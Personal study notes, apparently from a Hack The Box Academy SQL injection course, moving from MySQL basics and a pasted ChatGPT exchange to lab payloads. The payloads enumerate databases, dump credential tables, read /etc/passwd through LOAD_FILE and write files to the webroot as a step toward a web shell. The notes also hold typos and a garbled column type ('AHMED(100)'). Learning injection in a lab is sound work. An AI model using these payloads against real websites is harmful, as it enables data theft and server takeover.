# Introduction

- database is being utilized in the back-end server .
- it helps in making the webpage dynamic .
- the interaction between database and webpage is in realtime .
    
    1. the request arrives from the user to the database .
    2. back-end server issues queries to the database to build the response .
    3. those que_ries contain information from the (request) that the user send and may be other information ( relevant ) .
    
    [![](https://academy.hackthebox.com/storage/modules/33/db_request_3.png)](https://academy.hackthebox.com/storage/modules/33/db_request_3.png)
    
- those are :
    
    user → tier1 → tier2 → DBMS
    
      
    

  

# SQLi (SQL injection ):

- there is alot of injections that we can use in a web application such as :
    1. HTTP injection
    2. Code injection
    3. Command injection
    4. and the most common injection which is SQL injeciton (SQLi)

## How does ————> SQL injection occurs ?

- when the hacker attempts to pass inputs that changes the final SQL query directly against the database .

  

## How to do SQL injection ?

- there are many ways to do SQL injection . . .
- to get SQL injection to work the hacker must do :
    1. inject SQL code
    2. subvert (destroy) the web application logic
        
        1. by changing the original query
        2. or → executing a completely new one
        
        like using [stacked](https://www.sqlinjection.net/stacked-queries/) queries or using [Union](https://www.mysqltutorial.org/sql-union-mysql.aspx/) queries.
        
          
        
          
        

## Intro to Databases:

  

## DBMS → database management system

sql is a language for databases (stuctured query language )

  

# Types of Databases

---

Databases, in general, are categorized into `Relational Databases` and `Non-Relational Databases`. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.

  

- The most common example of a NoSQL database is `MongoDB`. not rational .
    - Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.

## Intro to MYSQL (little programming on SQL)

- this module introduces sql injection through MYSQL .
- MySQL is an open-source relational database management system (RDBMS) that uses SQL (Structured Query Language) to manage databases. It is one of the most popular database systems and is widely used for web applications and other types of software. MySQL allows users to store, retrieve, and manipulate data efficiently. It offers various features such as data security, scalability, and high performance.
- this section will cover some of the basics of ( MYSQL ) (SQL’s) basics and syntax used within MYSQL and MariaDB databases they both are opensource databases
- SQL :
    - the syntax can differ form one RDBMS to another . which means from one rational database mangament system to another .
    - the syntax of a data base management system is >>> THe language of typing a RDBMS rational data base management system .
    - but they all should follow the iso standard for Structured Query Language .
- Command line :
    - The mysql utility is used to authenticate to and interact with a MYSQL | MariaDB database.
    - and the flags used with mysql utility are :
        - -u —> for the user name
        - -p —→ for the password dont put space between the flag and the password
        - -h ——> host
        - -P ——> Port
    - once we get access via mysql -u username -ppasswordstring -h host -P port after that we will be in mysql>…..we can type here……
    - and now we will be able to control the RDBMS via commands so what commands can be used ?
        - as we said according to which SQL we are using cause each one of them contains its own syntax ( language of commanding ) .
            - for our mysql > we will use
                
                - CREATE DATABASE name_of_database;
                - SHOW DATABASES;
                    - it is like (ls) but for the databases to show all the databases on the hosted server via the choosen port .
                - USE users;
                    - in this case we already named a database by the name users and now we want to use this database
                
                > ---
                > 
                > ## Creating a database
                > 
                > Once we log in to the database using the `mysql` utility,  
                > we can start using SQL queries to interact with the DBMS. For example, a  
                > new database can be created within the MySQL DBMS using the [CREATE DATABASE](https://dev.mysql.com/doc/refman/5.7/en/create-database.html) statement.
                > 
                > ```
                > mysql> CREATE DATABASE users;
                > 
                > Query OK, 1 row affected (0.02 sec)
                > ```
                > 
                > MySQL expects command-line queries to be terminated with a semi-colon. The example above created a new database named `users`. We can view the list of databases with [SHOW DATABASES](https://dev.mysql.com/doc/refman/8.0/en/show-databases.html), and we can switch to the `users` database with the `USE` statement:
                > 
                > ```
                > mysql> SHOW DATABASES;
                > 
                > +--------------------+
                > | Database           |
                > +--------------------+
                > | information_schema |
                > | mysql              |
                > | performance_schema |
                > | sys                |
                > | users              |
                > +--------------------+
                > 
                > mysql> USE users;
                > 
                > Database changed
                > ```
                > 
                > SQL statements aren't case sensitive, which means 'USE  
                > users;' and 'use users;' refer to the same command. However, the  
                > database name is case sensitive, so we cannot do 'USE USERS;' instead of  
                > 'USE users;'. So, it is a good practice to specify statements in  
                > uppercase to avoid confusion.
                
- Tables :
    
    - As we can see, the `CREATE TABLE` query first specifies the  
        table name, and then (within parentheses) we specify each column by its  
        name and its data type, all being comma separated. After the name and  
        type, we can specify specific properties, as will be discussed later.
    
    ```
    mysql> CREATE TABLE logins(
    				id INT,
    				username AHMED(100), 
    				password AHMED(100), 
    				date_of_joining DATETIME
    				);
    ```
    
    USING THIS WE :
    
    - are should now find a TABLE created under the name logins
    - lets show the (TABLES) that we have to make sure
        
        - semillar to SHOW DATABASES==;==
        
        ```
        mysql> SHOW TABLES;
        
        +-----------------+
        | Tables_in_users |
        +-----------------+
        | logins          |
        +-----------------+
        1 row in set (0.00 sec)
        ```
        
    - to cat a database or table use ==DESCRIBE name_of_it;==
        
        - cat semilar to describe
        
        ```
        mysql> DESCRIBE logins;
        
        +-----------------+--------------+
        | Field           | Type         |
        +-----------------+--------------+
        | id              | int          |
        | username        | varchar(100) |
        | password        | varchar(100) |
        | date_of_joining | date         |
        +-----------------+--------------+
        4 rows in set (0.00 sec)
        ```
        
    

### Table Properties

Within the `CREATE TABLE` query, there are many [properties](https://dev.mysql.com/doc/refman/8.0/en/create-table.html) that can be set for the table and each column. For example, we can set the `id` column to auto-increment using the `AUTO_INCREMENT` keyword, which automatically increments the id by one every time a new item is added to the table:

Code: sql

```
    id INT NOT NULL AUTO_INCREMENT,
```

The `NOT NULL` constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the `UNIQUE` constraint to ensures that the inserted item are always unique. For example, if we use it with the `username` column, we can ensure that no two users will have the same username:

Code: sql

```
    username VARCHAR(100) UNIQUE NOT NULL,
```

Another important keyword is the `DEFAULT` keyword, which is used to specify the default value. For example, within the `date_of_joining` column, we can set the default value to [Now()](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now), which in MySQL returns the current date and time:

Code: sql

```
    date_of_joining DATETIME DEFAULT NOW(),
```

Finally, one of the most important properties is `PRIMARY KEY`,  
which we can use to uniquely identify each record in the table,  
referring to all data of a record within a table for relational  
databases, as previously discussed in the previous section. We can make  
the `id` column the `PRIMARY KEY` for this table:

Code: sql

```
    PRIMARY KEY (id)
```

The final `CREATE TABLE` query will be as follows:

Code: sql

```
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

  

## SQL statements(imp statements for hacking||||(:

- INSERT statement:
    
    - `INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ....);`
    - as a live example :
        - `INSERT INTO logins VALUES (1, 'admin', 'p@ssw0rd', '2020-07-02');`
    
    We can do the same to insert values into the `logins` table:
    
    - `INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');`
    - `ISNERT INTO logins(username, password) VALUES('admin','admin')('user','user');` by this way we entered mutlible values for the same under the same rows on the same table .
- SELECT statement:
    - `SELECT * FROM table_name;`
        - this command selects all the columns as the star sign (asterisk symbol) acts as a wildcard and selects all the columns .
    - `SELECT column1, column2 FROM table_name;`
        
        ```
        mysql> SELECT * FROM logins;
        
        +----+---------------+------------+---------------------+
        | id | username      | password   | date_of_joining     |
        +----+---------------+------------+---------------------+
        |  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
        |  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
        |  3 | john          | john123!   | 2020-07-02 11:47:16 |
        |  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
        +----+---------------+------------+---------------------+
        4 rows in set (0.00 sec)
        
        
        mysql> SELECT username,password FROM logins;
        
        +---------------+------------+
        | username      | password   |
        +---------------+------------+
        | admin         | p@ssw0rd   |
        | administrator | adm1n_p@ss |
        | john          | john123!   |
        | tom           | tom123!    |
        +---------------+------------+
        4 rows in set (0.00 sec)
        ```
        
        The first query in the example above looks at all records present in the logins table. We can see the four records which were entered before. The second query selects just the username and password columns while skipping the other two.
        
          
        
- DROP statement:
    - We can use [DROP](https://dev.mysql.com/doc/refman/8.0/en/drop-table.html) to remove tables and databases from the server.
    - we said that we have a table called logins if we want to remove it we will:
        - `DROP TABLE logins;`
        - and by this way we deleted the table called logins from our tables and to make sure from that we can use `SHOW TABLES;`
- ALTER statement:
    
    - ALTER makes a changes (add new column to an existing table - delete (drop) - rename any part ).
    - lets put the alter branches into work
        - `ALTER TABLE logins ADD newcolumn INT;`
        - `ALTER TABLE logins RENAME newcolumn TO oldcolumn;`
        - `ALTER TABLE logins MODIFY oldcolumn DATE;`
        - `ALTER TABLE logins DROP oldcolumn;`
        
    
      
    
- UPDATE Statement:
    - While ALTER is used to change a table's properties, the UPDATE statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:  
        Code: sql
    - UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
    - We specify the table name, each column and its new value, and the condition for updating records. Let us look at an example:
    - mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
    - Query OK, 3 rows affected (0.00 sec)  
        Rows matched: 3 Changed: 3 Warnings: 0
    - mysql> SELECT * FROM logins;
    - +----+---------------+-----------------+---------------------+  
        | id | username | password | date_of_joining |  
        +----+---------------+-----------------+---------------------+  
        | 1 | admin | p@ssw0rd | 2020-07-02 00:00:00 |  
        | 2 | administrator | change_password | 2020-07-02 11:30:50 |  
        | 3 | john | change_password | 2020-07-02 11:47:16 |  
        | 4 | tom | change_password | 2020-07-02 11:47:16 |  
        +----+---------------+-----------------+---------------------+  
        4 rows in set (0.00 sec)
        
        The query above updated all passwords in all records where the id was more significant than 1.
        
        Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.
        
          
        

  

  

> THIS EMPLEMENTS THE MAIN IDEA OF RDBMS:
> 
> [![](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)
> 
> What is the department number for the 'Development' department? ERROR 1146 (42S02): Table 'employees.department' doesn't exist  
> MariaDB [employees]> describe departments;  
> +-----------+-------------+------+-----+---------+-------+  
> | Field | Type | Null | Key | Default | Extra |  
> +-----------+-------------+------+-----+---------+-------+  
> | dept_no | char(4) | NO | PRI | NULL | |  
> | dept_name | varchar(40) | NO | UNI | NULL | |  
> +-----------+-------------+------+-----+---------+-------+  
> 2 rows in set (0.077 sec)  
>   
> MariaDB [employees]>
> 
> ChatGPT
> 
> It seems you are interacting with a MariaDB database and looking for the department number (`dept_no`) for the 'Development' department.
> 
> Based on the schema provided, the `departments` table consists of two columns: `dept_no` and `dept_name`. To find the department number for the 'Development' department, you would run the following SQL query:
> 
> ```
> sql
> ```
> 
> ```
> SELECT dept_no FROM departments WHERE dept_name = 'Development';
> 
> ```
> 
> Run this query in your MariaDB instance, and it should return the department number (`dept_no`) for the 'Development' department. If the 'Development' department does not exist, the result will be empty.
> 
> [![](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)
> 
> MariaDB [employees]> SELECT dept_no FROM departments WHERE dept_name = 'Development';  
> +---------+  
> | dept_no |  
> +---------+  
> | d005 |  
> +---------+  
> 1 row in set (0.077 sec)
> 
> ChatGPT
> 
> The department number (`dept_no`) for the 'Development' department in your MariaDB database is `d005`.
> 
> [![](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)
> 
> from where did it appeared ?
> 
> ChatGPT
> 
> The department number `d005` for the 'Development' department appeared as a result of the query you executed on the `departments` table in your MariaDB database. When you ran the query:
> 
> ```
> sql
> ```
> 
> ```
> SELECT dept_no FROM departments WHERE dept_name = 'Development';
> 
> ```
> 
> it searched the `departments` table for rows where the `dept_name` column matches 'Development'. The result, `d005`, indicates that in the data stored in your `departments` table, the 'Development' department has been assigned the department number `d005`.
> 
> In other words, the value `d005` was already present in your database; the SQL query just retrieved it for you.
> 
> [![](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)
> 
> yes but the field were only dept_no and dept_name so where did we got departments from ?
> 
> ChatGPT
> 
> I see what you're getting at. Let's clarify.
> 
> When you provided the table schema:
> 
> ```
> sql
> ```
> 
> ```
> describe departments;
> 
> ```
> 
> The output showed columns of the `departments` table which are `dept_no` and `dept_name`.
> 
> When you executed:
> 
> ```
> sql
> ```
> 
> ```
> SELECT dept_no FROM departments WHERE dept_name = 'Development';
> 
> ```
> 
> You were querying the `departments` table (which you described earlier) and asking it to return the `dept_no` (department number) for rows where the `dept_name` is 'Development'.
> 
> The table name (`departments`) and its columns (`dept_no` and `dept_name`) are all elements of the database's schema. The actual data within the table (like `d005` for 'Development') is what's stored in the table based on that schema.
> 
> To summarize:
> 
> - `departments` is the table name.
> - `dept_no` and `dept_name` are column names within that table.
> - The actual values like `d005` and 'Development' are data entries inside the `departments` table.
> 
> [![](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)](https://chat.openai.com/_next/image?url=https%3A%2F%2Fs.gravatar.com%2Favatar%2F1f6dec2fac52ba2905201b3c42b52cf7%3Fs%3D480%26r%3Dpg%26d%3Dhttps%253A%252F%252Fcdn.auth0.com%252Favatars%252Fpe.png&w=96&q=75)
> 
> and how can i display all data entries ? on the departmets table
> 
> ChatGPT
> 
> To display all data entries in the `departments` table, you can use the `SELECT` statement without any conditions. Here's how you can do it:
> 
> ```
> sql
> ```
> 
> ```
> SELECT * FROM departments;
> 
> ```
> 
> This query will return all rows and columns from the `departments` table, displaying both the `dept_no` and `dept_name` for every department in the table.

  

  

## navigation in a DB

💡

table ———> use

💡

column ———→describe

💡

entries ——→ select*from table_name

## Query Results:

in this section , we will learn how to control the results output of any query .

### sorting results:

- we can sort the results of any query using ORDER BY and sepcifying the column to sort by :
    - mysql > ==SELECT * FROM logins ORDER BY password;== this will select everything from logins and order them by the asending of the start of passwords
    - `SELECT * FROM logins ORDER BY password DESC`
        - same but it will be desecinding
- `mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;`
    

  

## LIKE Clause

Another useful SQL clause is [LIKE](https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html), enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with `admin`:

```
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

The `%` symbol acts as a wildcard and matches all characters after `admin`. It is used to match zero or more characters. Similarly, the `_`  
symbol is used to match exactly one character. The below query matches  
all usernames with exactly three characters in them, which in this case  
was `tom`:

```
mysql> SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
1 row in set (0.01 sec)
```

## SQL Operators:

- sometimes single condition is not enough so we will need to use AND, OR, and NOT.
    
    - AND:
        
        con1 AND con2
        
    
    and so on with OR and NOT.
    
- they also can be said as [ && , || and ! ].

## Operators in queries:

- we can say not equal → ! = → ≠

  

## Multiple Operator precedence ( priority ) :

- Division (`/`), Multiplication (), and Modulus (`%`)
- Addition (`+`) and subtraction ()
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

  

  

## Types of SQL Injections

  

SQL Injections are categorized based on how and where we retrieve their output.

[![](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)

In simple cases, the output of both the intended and the new query  
may be printed directly on the front end, and we can directly read it.  
This is known as `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.

With `Union Based` SQL injection, we may have to specify  
the exact location, 'i.e., column', which we can read, so the query will  
direct the output to be printed there. As for `Error Based` SQL injection, it is used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

In more complicated cases, we may not get the output printed, so we  
may utilize SQL logic to retrieve the output character by character.  
This is known as `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.

With `Boolean Based` SQL injection, we can use SQL  
conditional statements to control whether the page returns any output at  
all, 'i.e., original query response,' if our conditional statement  
returns `true`. As for `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.

Finally, in some cases, we may not have direct access to the output  
whatsoever, so we may have to direct the output to a remote location,  
'i.e., DNS record,' and then attempt to retrieve it from there. This is  
known as `Out-of-band` SQL injection.

In this module, we will only be focusing on introducing SQL injections through learning about `Union Based` SQL injection.

  

  

## subverting Query Logic :

- subverting == destroying : |

  

## detecting number of columns :

two methods:

- using ORDER BY .
    - The first way of detecting the number of columns is through the `ORDER BY`  
        function, which we discussed earlier. We have to inject a query that  
        sorts the results by a column we specified, 'i.e., column 1, column 2,  
        and so on', until we get an error saying the column specified does not  
        exist. ( we mainly depend on getting the error ) .
- using UNION
    
    - we use union to say select c1, c2, c3 if it gets an error then we try to continue adding columns tell it says that it works and print them out . and by this we will knew that the number of columns we have is the last number of columns we had selected .
    
      
    
      
    

## SQL injection:

## Types of SQL Injections

SQL Injections are categorized based on how and where we retrieve their output.

[![](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)

In simple cases, the output of both the intended and the new query  
may be printed directly on the front end, and we can directly read it.  
This is known as `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.

  

  

|   |   |   |   |
|---|---|---|---|
|In-band|union based|||
||Error based|||
|||||
|Blind|Boolean Based|||
||Time Based|||
|||||
|Out-of-band||||

With `Union Based` SQL injection, we may have to specify the  
exact location, 'i.e., column', which we can read, so the query will  
direct the output to be printed there

  

  

# Exploitation :

## Database Enumeration

- This section will put all of that to use and gather data from the database using SQL queries within SQL injections.

### MYSQL Fingerprinting:

- we need before enumerating any database we need to knew what is the DBMS it uses .

As an initial guess, if the webserver we see in HTTP responses is `Apache` or `Nginx`, it is a good guess that the webserver is running on Linux, so the DBMS is likely `MySQL`. The same also applies to Microsoft DBMS if the webserver is `IIS`, so it is likely to be `MSSQL`.  
However, this is a far-fetched guess, as many other databases can be  
used on either operating system or web server. So, there are different  
queries we can test to fingerprint the type of database we are dealing  
with.

As we cover `MySQL` in this module, let us fingerprint `MySQL` databases. The following queries and their output will tell us that we are dealing with `MySQL`:

|   |   |   |   |
|---|---|---|---|
|Payload|When to Use|Expected Output|Wrong Output|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|

## Information Schema database:

To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

With the above information, we can form our `SELECT` statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the `INFORMATION_SCHEMA` Database.

The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)  
database contains metadata about the databases and tables present on  
the server. This database plays a crucial role while exploiting SQL  
injection vulnerabilities. As this is a different database, we cannot  
call its tables directly with a `SELECT` statement. If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

Code: sql

```
SELECT * FROM my_database.users;
```

Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.

  

- command —→

```
' union select 1, 2,3,4 -- -
```

database() →ilfreight

  

  

data we need to knew :

- List of databases
    
    - find what ==databases== are available on the DBMS:
        
          
        
        ```
        ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
        ```
        
        |   |   |   |   |   |   |   |   |   |
        |---|---|---|---|---|---|---|---|---|
        |information_schema|||3|||4|||
        |mysql|||3|||4|||
        |performance_schema|||3|||4|||
        |ilfreight|||3|||4|||
        |dev|||3|||4|||
        
    
    we want to get into the dev via . and then see the tables on this dev database.
    

- List of tables within each database:
    - THE TABLES table in INFORMATION_SCHEMA database contains those columns :
        
        - TABLE_NAME ——→ says the name of the table
        - TABLE_SCHEMA ——> says on which database this table located on.
        
        ```
        ' union  select 1,table_name,table_schema,4  from INFORMATION_SCHEMA.TABLES-- -
        ```
        
        - we found this :
            
            -   
                
            
            |   |   |   |   |   |   |   |   |   |
            |---|---|---|---|---|---|---|---|---|
            |credentials|||dev|||4|||
            |framework|||dev|||4|||
            |posts|||dev|||4|||
            |pages|||dev|||4|||
            
            - we want dev.credentials

  

in the database dev there is a column called credentials .

now we want to see all columns on this credentials table

  

  

  

  

- List of columns within each table
    
    - in the INFORMATION_SCHEMA database :
    - there is also a columns table that contains the name of the columns of all databases
    - we can use column_name ——→ to get the name of the column
    - table _schema → to get the table that contains this column .
    
    ```
    ' UNION select 1,column_name,table_name,table_schema from INFORMATION_SCHEMA.columns-- -
    ```
    
    |   |   |   |   |   |   |   |   |   |
    |---|---|---|---|---|---|---|---|---|
    |username|||credentials|||dev|||
    |password|||credentials|||dev|||
    |page|||framework|||dev|||
    |page|||posts|||dev|||
    |page|||pages|||dev|||
    
    okay so now we knew that
    
    we have two columns in credentails table that is located in dev database
    
    1. username
    2. password
    
    as we want to union them with another table that shows 3 columns we will use the 3rd column as NULL
    
    ```
    ' union select 1,username,password,NULL from dev.credentials -- -
    ```
    
      
    
      
    
      
    
      
    

## task

we need to knew the password of a user

we can find it in user’s table

in ilfreight database

solve:

we are already in ilfreight database .

we new that there is a db called (inforamtion schema) that contains

tables about(tables , columns , databases)

we want to access → a table called users

```
' union select 1,username,password,NULL from ilfreight.users  -- -
```

we can also enter user table directly as we already in it db

but there is a problem we need to see how many columns on it and there names via informaition schema . columns because we are going to union users table with our 3 columns table

```
' union select 1,column_name ,table_schema, 4 from INFORMATION_SCHEMA.COLUMNS -- -
```

WE WILL ALSO use a condition to be faster

```
' union select 1,column_name ,table_schema, table_name from INFORMATION_SCHEMA.COLUMNS where table_name='users' -- -
```

okay we found it

|   |   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|---|
|id|||ilfreight|||users|||
|username|||ilfreight|||users|||
|password|||ilfreight|||users|||

we also found another table called users but it is in another db so it is not what we are looking for .

okay so now we have 3 columns called ( id, username, password )

```
' union select 1,id,username,password from ilfreight.users -- -
```

we got it :

|   |   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|---|
|1|||admin|||392037dbba51f692776d6cefb6dd546d|||
|2|||newuser|||9da2c9bcdf39d8610954e0e11ea8f45f|||

  

  

## Reading Files

- reading - writing - code excution on the backserver
- we start by gathering data about our

```
SELECT USER();
SELECT CURRENT_USER();
SELECT user FROM mysql.user;
```

select user(); —→> returns current user and host

select current_user(); —→ > returns current user also but witth the current permissions that current user has .

  

select user from mysql.user —→ selects mysql db and then at user(table) it shows us user(column) by saying select (the column name) its database.table

  

if we said that our current user is called (root).

and we wanted to knew is root user a DBU or DBAdmin

we will use ==super_priv== if we got y —→ then we are a super user and this means that when we used this command :

```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

- if we want to see what we can do then we can use
    
    - grantee
    - and to filter we will use [WHERE grantee=” ’root’@’localhost’ ” ]
    
    ```
    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
    ```
    
    - and we will see all of the posssible privileges given to our current user :
    
    ![[Untitled 2.png|Untitled 2.png]]
    

  

## reading file :

1. LOAD_FILE:
    
    1. Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function. The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/)  
        function can be used in MariaDB / MySQL to read data from files. The  
        function takes in just one argument, which is the file name. The  
        following query is an example of how to read the `/etc/passwd` file:
        
        ```
        SELECT LOAD_FILE('/etc/passwd');
        ```
        
        Similar to how we have been using a `UNION` injection, we can use the above query:
        
        Code: sql
        
        ```
        cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
        ```
        
        [![](https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png)](https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png)
        
        We were able to successfully read the contents of the passwd file  
        through the SQL injection. Unfortunately, this can be potentially used  
        to leak the application source code as well.
        
          
        
          
        
    
    ## writing files :
    
    - we can utilize the writing files on DBs to
        
        - write a [web shell on the remote server ] which will make us able to do code excution and take over the server .
        - most of the new dbms are not allowing writting files by default so we first need to make sure if it allows or not .
        
          
        
        things needed to write file :
        
        1. a user account that has File Privilege enabled .
        2. MYSQL global (secure_file_priv) variable not enabled .
        3. write access to the location we want to write to ( on the back-end server) .
        
          
        
        - for our example:
            
            - we have already found that our user which is
                - root@localhost is a superuser
                - so he has the file privilege . (1) is checked
            - the secure_file_priv variable:
                
                - the secure_file_priv is used to determine where to read/write files from .
                - an empty value for the secure_file_priv will make us able to read files from the entire file system .
                - NULL means we can’t read from anywhere.
                - some modern configurations default to NULL and thats bad for us .
                
                - how to knew the value of secure_file_priv :
                    
                    ```
                    SHOW VARIALES LIKE 'secure_file_priv';
                    ```
                    
                
                - we also can find it in the information_schema.global_variables and this table contains two columns variable_name , variable_value.
                - we will use the way of going to the table when we are using a way like UNION .
                
                  
                
            - write access to the location we want to write into .
                
            
              
            
              
            
              
            
    
      
    
      
    
      
    
    ## Writing Files through SQL Injection
    
    Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:
    
    Code: sql
    
    ```
    select 'file written successfully!' into outfile '/var/www/html/proof.txt'
    ```
    
    **Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`,  
    or we can search online for other possible configuration locations.  
    Furthermore, we may run a fuzzing scan and try to write files to  
    different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
    
    The `UNION` injection payload would be as follows:
    
    Code: sql
    
    ```
    cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
    ```
    
    [![](https://academy.hackthebox.com/storage/modules/33/write_proof.png)](https://academy.hackthebox.com/storage/modules/33/write_proof.png)
    
    We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:
    
    [![](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)
    
    Note: We see the string we dumped along with '1', '3'  
    before it, and '4' after it. This is because the entire 'UNION' query  
    result was written to the file. To make the output cleaner, we can use  
    "" instead of numbers.
    
    ---
    
    ## SELECT INTO OUTFILE :
    
    - The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files.
    - This is usually used for exporting data from tables.
    
